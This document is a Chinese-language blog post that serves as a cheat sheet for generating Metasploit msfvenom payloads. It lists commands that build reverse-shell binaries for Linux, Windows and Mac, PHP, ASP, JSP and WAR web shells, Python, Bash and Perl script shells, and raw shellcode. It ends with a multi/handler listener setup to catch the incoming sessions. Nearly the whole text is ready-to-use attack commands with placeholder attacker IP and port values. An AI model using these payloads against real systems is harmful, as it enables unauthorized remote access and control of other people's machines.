---
title: msfvenom生成payloads
layout: post
tags: 
  - shell
  - command
  - reverseshell
category: 
  - hack
  - sec
comments: true
share: true
description: MSF可以利用msfvenom生成payload，提供有效的shell。对于每个有效的payload，可以进入`exploit/multi/handler`，通过`set payload`设置监听。（设置LSHOT和LPORT，LHOST为本地IP）
---

* TOC
{:toc}

MSF可以利用msfvenom生成payload，提供有效的shell。对于每个有效的payload，可以进入`exploit/multi/handler`，通过`set payload`设置监听。（设置LSHOT和LPORT，LHOST为本地IP）

<!--more-->

## 列出payload

```bash
msfvenom -l
```

## Binaries

### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

### Mac

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

## Web Payloads

### PHP

```php
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

### WAR

```java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

## Script Payloads

### Python

```python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

### Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

### Perl

```perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

## Shellcode

有关所有shellcode的信息，请参阅`msfvenom --help-formats`参数

```bash
msf exploit(handler) > msfvenom --help-formats
[*] exec: msfvenom --help-formats

Executable formats
    asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
    bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```


### Linux Based Shellcode

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```
### Windows Based Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

### Mac Based Shellcode

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

## Handlers

使用`exploit/multi/handler`快速处理传入的shell：

```bash
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

